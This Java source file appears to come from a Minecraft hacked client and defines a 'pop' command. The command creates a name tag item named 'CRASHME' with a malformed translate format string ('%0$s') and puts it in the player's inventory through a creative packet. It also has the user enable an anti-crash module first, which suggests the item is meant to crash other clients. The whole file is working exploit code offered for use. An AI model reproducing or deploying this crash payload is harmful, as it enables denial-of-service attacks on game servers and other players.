package net.shadow.feature.command;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.shadow.Shadow;
import net.shadow.feature.ModuleRegistry;
import net.shadow.feature.base.Command;
import net.shadow.utils.ChatUtils;

import java.util.List;

public class PopCmd extends Command {
    public PopCmd() {
        super("pop", "give the among-us name tag");
    }

    public static void drop(int slot) {
        Shadow.c.interactionManager.clickSlot(Shadow.c.player.currentScreenHandler.syncId, slot, 1, SlotActionType.THROW, Shadow.c.player);
    }

    @Override
    public void call(String[] args) {
        ItemStack CRASHME = new ItemStack(Items.NAME_TAG, 1);
        try {
            CRASHME.setNbt(StringNbtReader.parse("{display:{Name:'{\"translate\":\"%0$s\"}'}}"));
        } catch (CommandSyntaxException e) {
            e.printStackTrace();
        }
        if(!ModuleRegistry.find("AntiCrash").isEnabled()){
            ChatUtils.message("Please Enable Anti-Crash with block poof setting before getting the among-us nametag");
        }else{
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(9, CRASHME));
        }
    }
}
